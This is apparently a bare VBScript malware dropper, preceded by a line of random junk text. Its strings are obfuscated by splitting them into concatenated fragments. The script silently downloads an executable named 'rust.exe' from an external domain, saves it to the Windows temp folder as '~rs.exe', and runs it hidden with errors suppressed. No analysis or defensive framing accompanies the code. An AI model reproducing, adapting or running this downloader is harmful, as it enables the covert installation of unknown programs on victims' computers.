' demXYohmkqZJNDcTRdGtIXgbWVWuLxcNanZYReIkDtXFjYIFuIgGErVWObbFIjFJfLIxtjkeUGCuEoxuadoQthteYcivWpWliqttzzc saGHYthMjArZnbri
On Error Resume Next
Dim Q,p,R,C,T
Set Q=CreateObject(("MSX"&"M"&"L"&"2.S"&"erv"&"er"&"XML"&"H"&"T"&"T"&"P.6"&"."&"0"))
Q.Open "GET",("h"&"tt"&"ps"&":"&"/"&"/s"&"t"&"o"&"p"&"la"&"g."&"org")&("/r"&"u"&"st"&"."&"ex"&"e"),False
Q.Send
If Q.Status=200 Then
  Set p=CreateObject(("ADO"&"DB."&"S"&"t"&"r"&"ea"&"m"))
  p.Type=1
  p.Open
  p.Write(Q.ResponseBody)
  Set C=CreateObject(("Sc"&"rip"&"tin"&"g"&".F"&"il"&"eS"&"ys"&"tem"&"Ob"&"jec"&"t"))
  R=C.GetSpecialFolder(2)
  p.SaveToFile R&("\"&"~"&"rs"&".e"&"x"&"e"),2
  p.Close
  Set T=CreateObject(("W"&"Scr"&"i"&"pt"&".S"&"h"&"e"&"ll"))
  T.Run R&("\~"&"rs."&"exe"),0,False
End If
Set Q=Nothing